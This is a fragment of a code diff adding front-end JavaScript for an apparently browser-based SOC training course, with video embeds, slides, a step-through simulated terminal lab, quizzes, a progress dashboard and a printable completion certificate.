+    return u.protocol === 'https:' || u.protocol === 'http:';
+  } catch(e) { return false; }
+}
+
+function getEmbedHtml(url) {
+  if (!isValidEmbedUrl(url)) return getPlaceholderHtml();
+  let src = url;
+  // YouTube
+  const yt = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
+  if (yt) src = `https://www.youtube.com/embed/${yt[1]}?rel=0`;
+  // Vimeo
+  const vm = url.match(/vimeo\.com\/(\d+)/);
+  if (vm) src = `https://player.vimeo.com/video/${vm[1]}`;
+  return `<iframe src="${src}" allowfullscreen allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" sandbox="allow-scripts allow-same-origin allow-presentation allow-popups"></iframe>`;
+}
+
+function getPlaceholderHtml() {
+  return `<div class="video-placeholder"><div class="video-placeholder-icon">▶</div><div class="video-placeholder-text">CLICK TO ADD VIDEO</div></div>`;
+}
+
+function embedVideo(level, idx) {
+  const input = document.getElementById(`vid-input-${level}-${idx}`);
+  const url = input.value.trim();
+  if (!url) return;
+  if (!isValidEmbedUrl(url)) {
+    input.style.borderColor = 'var(--red)';
+    input.placeholder = 'Only https:// URLs work — file:/// paths are not supported';
+    setTimeout(() => { input.style.borderColor = ''; input.placeholder = 'Paste YouTube / Vimeo / embed URL...'; }, 3000);
+    return;
+  }
+  PS.videos = PS.videos || {l1:[],l2:[],l3:[]};
+  PS.videos[level] = PS.videos[level] || [];
+  PS.videos[level][idx] = url;
+  saveState(PS);
+  document.getElementById(`vid-wrap-${level}-${idx}`).innerHTML = getEmbedHtml(url);
+  logActivity('lab', `Added video to ${level.toUpperCase()} slot ${idx+1}`);
+}
+
+// ═══════════════════════════════════════════
+// SLIDES
+// ═══════════════════════════════════════════
+function initSlides(level) { renderSlide(level); renderPips(level); }
+
+function renderPips(level) {
+  const el = document.getElementById(level + '-pips');
+  if (!el) return;
+  el.innerHTML = SLIDES[level].map((_,i) => `<div class="slide-pip ${i===0?'active':''}" id="${level}-pip-${i}"></div>`).join('');
+}
+
+function renderSlide(level) {
+  const s = slideState[level];
+  const slide = SLIDES[level][s.slide];
+  const total = SLIDES[level].length;
+  const counter = document.getElementById(level + '-counter');
+  const prev = document.getElementById(level + '-prev');
+  const next = document.getElementById(level + '-next');
+  if (counter) counter.textContent = `${s.slide+1} / ${total}`;
+  if (prev) prev.disabled = s.slide === 0;
+  if (next) next.disabled = s.slide === total-1;
+  document.querySelectorAll(`#${level}-pips .slide-pip`).forEach((p,i) => p.classList.toggle('active', i === s.slide));
+  const el = document.getElementById(level + '-slide-content');
+  if (!el) return;
+  el.innerHTML = `<div class="slide active">
+    <div class="slide-eyebrow">${slide.eyebrow}</div>
+    <h2>${slide.title}</h2>
+    <div class="slide-body">${slide.points.map(p => `
+      <div class="slide-point">
+        <div class="point-icon">${p.icon}</div>
+        <div><div class="point-title">${p.title}</div><div class="point-desc">${p.desc}</div></div>
+      </div>`).join('')}
+    </div>
+  </div>`;
+}
+
+function changeSlide(level, dir) {
+  const s = slideState[level];
+  const total = SLIDES[level].length;
+  s.slide = Math.max(0, Math.min(total-1, s.slide + dir));
+  renderSlide(level);
+}
+
+// ═══════════════════════════════════════════
+// LAB
+// ═══════════════════════════════════════════
+function initLabPanel(level) {
+  const list = document.getElementById(level + '-scenario-list');
+  if (!list) return;
+  const scenarios = SCENARIOS[level];
+  const done = PS[level].labsDone || [];
+  list.innerHTML = scenarios.map((s,i) => `
+    <div class="lab-scenario ${i===0?'active':''} ${done.includes(i)?'lab-done':''}" id="${level}-sc-${i}" onclick="loadScenario('${level}',${i},this)">
+      <div class="scenario-num">LAB ${String(i+1).padStart(2,'0')}</div>
+      <div class="scenario-name">${s.name}</div>
+      <span class="scenario-tag tag-${s.tag}">${s.tag.toUpperCase()}</span>
+    </div>`).join('');
+  loadScenario(level, 0, document.getElementById(level + '-sc-0'));
+}
+
+function loadScenario(level, idx, el) {
+  document.querySelectorAll(`#${level}-scenario-list .lab-scenario`).forEach(s => s.classList.remove('active'));
+  if (el) el.classList.add('active');
+  labState[level].scenario = idx;
+  labState[level].step = 0;
+  renderLabMain(level, idx);
+}
+
+function renderLabMain(level, idx) {
+  const s = SCENARIOS[level][idx];
+  const el = document.getElementById(level + '-lab-main');
+  if (!el) return;
+  el.innerHTML = `
+    <div class="lab-brief">
+      <div class="lab-brief-title">// SCENARIO BRIEF</div>
+      <h3>${s.name}</h3>
+      <p>${s.brief}</p>
+      <div class="lab-objectives">${s.objectives.map(o => `<span class="obj-tag">${o}</span>`).join('')}</div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span>
+        <span class="term-label">SOC TERMINAL — SIMULATED LAB</span>
+      </div>
+      <div class="terminal-output" id="${level}-term-out"></div>
+      <div class="terminal-input">
+        <span class="term-prompt-icon">analyst@soc:~$</span>
+        <input class="term-input-field" id="${level}-term-in" placeholder="Press ENTER to step through the simulation..." autocomplete="off" spellcheck="false" onkeydown="handleTerm(event,'${level}')">
+      </div>
+    </div>
+    <div class="lab-hint">// <span>TIP:</span> Press ENTER to step through. Type anything and hit ENTER to proceed.</div>`;
+  renderTermStep(level, 0);
+}
+
+function renderTermStep(level, stepIdx) {
+  const scenario = SCENARIOS[level][labState[level].scenario];
+  const out = document.getElementById(level + '-term-out');
+  if (!out) return;
+  if (stepIdx >= scenario.steps.length) {
+    out.innerHTML += `<div class="term-line term-ok">// Lab complete. All steps demonstrated.</div>`;
+    out.scrollTop = out.scrollHeight;
+    const done = PS[level].labsDone || [];
+    if (!done.includes(labState[level].scenario)) {
+      done.push(labState[level].scenario);
+      PS[level].labsDone = done;
+      saveState(PS);
+      const sc = document.getElementById(`${level}-sc-${labState[level].scenario}`);
+      if (sc) sc.classList.add('lab-done');
+      logActivity('lab', `Completed ${level.toUpperCase()} Lab: ${scenario.name}`);
+    }
+    return;
+  }
+  const step = scenario.steps[stepIdx];
+  if (step.cmd) out.innerHTML += `<div class="term-line"><span class="term-prompt">analyst@soc:~$ </span><span class="term-cmd">${step.cmd}</span></div>`;
+  step.out.forEach(([cls, txt]) => { out.innerHTML += `<div class="term-line ${cls}">${txt}</div>`; });
+  out.scrollTop = out.scrollHeight;
+}
+
+function handleTerm(e, level) {
+  if (e.key !== 'Enter') return;
+  const s = labState[level];
+  const scenario = SCENARIOS[level][s.scenario];
+  document.getElementById(level + '-term-in').value = '';
+  if (s.step < scenario.steps.length) {
+    renderTermStep(level, s.step);
+    s.step++;
+  } else {
+    const out = document.getElementById(level + '-term-out');
+    if (out) { out.innerHTML += `<div class="term-line term-dim">// All steps shown. Select another scenario.</div>`; out.scrollTop = out.scrollHeight; }
+  }
+}
+
+// ═══════════════════════════════════════════
+// QUIZ
+// ═══════════════════════════════════════════
+function initQuiz(level) {
+  quizScores[level] = 0;
+  document.getElementById(level + '-score').textContent = 0;
+  document.getElementById(level + '-quiz-complete').classList.remove('show');
+  const qBtn = document.getElementById(level + '-cert-unlock');
+  if (qBtn) qBtn.classList.remove('show');
+  const body = document.getElementById(level + '-quiz-body');
+  body.style.display = '';
+  const qs = QUIZZES[level];
+  body.innerHTML = qs.map((q,qi) => `
+    <div class="quiz-card" id="${level}-q-${qi}">
+      <div class="quiz-q-num">QUESTION ${String(qi+1).padStart(2,'0')} OF ${qs.length}</div>
+      <div class="quiz-question">${q.q}</div>
+      <div class="quiz-options">${q.opts.map((o,oi) => `
+        <div class="quiz-option" id="${level}-q${qi}-o${oi}" onclick="answerQ('${level}',${qi},${oi})">
+          <span class="opt-letter">${String.fromCharCode(65+oi)}</span><span>${o}</span>
+        </div>`).join('')}
+      </div>
+      <div class="quiz-explanation" id="${level}-exp-${qi}">${q.exp}</div>
+    </div>`).join('') + `<button class="quiz-btn" onclick="submitQuiz('${level}')">SUBMIT ASSESSMENT</button>`;
+}
+
+function answerQ(level, qi, oi) {
+  const q = QUIZZES[level][qi];
+  const opts = document.querySelectorAll(`#${level}-q-${qi} .quiz-option`);
+  opts.forEach(o => o.classList.add('disabled'));
+  opts[oi].classList.add(oi === q.ans ? 'correct' : 'wrong');
+  opts[q.ans].classList.add('correct');
+  document.getElementById(`${level}-exp-${qi}`).classList.add('show');
+  if (oi === q.ans) {
+    quizScores[level]++;
+    document.getElementById(level + '-score').textContent = quizScores[level];
+  }
+}
+
+function submitQuiz(level) {
+  const total = QUIZZES[level].length;
+  const score = quizScores[level];
+  document.getElementById(level + '-quiz-body').style.display = 'none';
+  const complete = document.getElementById(level + '-quiz-complete');
+  complete.classList.add('show');
+  document.getElementById(level + '-final-score').textContent = `${score}/${total}`;
+  const passed = score >= 3;
+  if (passed) {
+    PS[level].quizPassed = true;
+    saveState(PS);
+    logActivity('quiz', `Passed ${level.toUpperCase()} assessment: ${score}/${total}`);
+    checkCertUnlock(level);
+    const btn = document.getElementById(level + '-cert-unlock');
+    if (btn) btn.classList.add('show');
+  } else {
+    logActivity('quiz', `Attempted ${level.toUpperCase()} assessment: ${score}/${total}`);
+  }
+}
+
+function resetQuiz(level) {
+  document.getElementById(level + '-quiz-body').style.display = '';
+  initQuiz(level);
+}
+
+// ═══════════════════════════════════════════
+// DASHBOARD
+// ═══════════════════════════════════════════
+function updateDashBar(level) {
+  const done = (PS[level].modules || []).length;
+  const total = MODULES[level].length;
+  const pct = Math.round((done / total) * 100);
+  const bar = document.getElementById('bar-' + level);
+  const stat = document.getElementById('stat-' + level);
+  if (bar) bar.style.width = pct + '%';
+  if (stat) stat.textContent = pct + '%';
+  const dashCard = document.querySelector(`.dc-${level} .dc-stats span:last-child`);
+  if (dashCard) dashCard.textContent = `${done}/${total} modules`;
+}
+
+function checkCertUnlock(level) {
+  const allDone = (PS[level].modules || []).length === MODULES[level].length;
+  const quizOk = PS[level].quizPassed;
+  const card = document.getElementById('cert-card-' + level);
+  const status = document.getElementById('cert-status-' + level);
+  const btn = document.getElementById('cert-btn-' + level);
+  if (allDone && quizOk) {
+    if (card) { card.classList.remove('locked'); card.classList.add('unlocked'); }
+    if (status) { status.textContent = 'UNLOCKED'; status.className = 'cert-status unlocked-s'; }
+    if (btn) btn.classList.add('show');
+  }
+}
+
+function renderDashboard() {
+  ['l1','l2','l3'].forEach(level => {
+    updateDashBar(level);
+    checkCertUnlock(level);
+  });
+  renderActivityLog();
+}
+
+function confirmReset() {
+  if (confirm('Reset ALL progress? This cannot be undone.')) {
+    PS = {l1:{modules:[],quizPassed:false,labsDone:[]},l2:{modules:[],quizPassed:false,labsDone:[]},l3:{modules:[],quizPassed:false,labsDone:[]},videos:{l1:[],l2:[],l3:[]},activity:[]};
+    saveState(PS);
+    renderDashboard();
+    ['l1','l2','l3'].forEach(renderModules);
+  }
+}
+
+// ═══════════════════════════════════════════
+// CERTIFICATE
+// ═══════════════════════════════════════════
+let currentCertLevel = 'l1';
+
+function openCertModal(level) {
+  currentCertLevel = level;
+  const info = CERT_INFO[level];
+  document.getElementById('cert-title-display').innerHTML = info.title;
+  document.getElementById('cert-badge-display').textContent = info.badge;
+  document.getElementById('cert-badge-display').style.color = info.color;
+  document.getElementById('cert-badge-display').style.borderColor = info.color;
+  document.getElementById('cert-body-display').textContent = info.body;
+  document.getElementById('cert-date-display').textContent = new Date().toLocaleDateString('en-CA',{year:'numeric',month:'long',day:'numeric'});
+  document.getElementById('cert-id-display').textContent = 'CREDENTIAL ID: CCA-' + level.toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
+  const nameInput = document.getElementById('cert-name-input');
+  nameInput.value = '';
+  document.getElementById('cert-name-display').textContent = 'YOUR NAME HERE';
+  document.getElementById('cert-modal').classList.add('show');
+}
+
+function closeCertModal() {
+  document.getElementById('cert-modal').classList.remove('show');
+}
+
+function updateCertName(val) {
+  document.getElementById('cert-name-display').textContent = val || 'YOUR NAME HERE';
+}
+
+// ═══════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════
+window.addEventListener('load', () => {
+  ['l1','l2','l3'].forEach(level => {
+    renderModules(level);
+    initSlides(level);
+  });
+  renderDashboard();
+});
+</script>
+</body>
+</html>
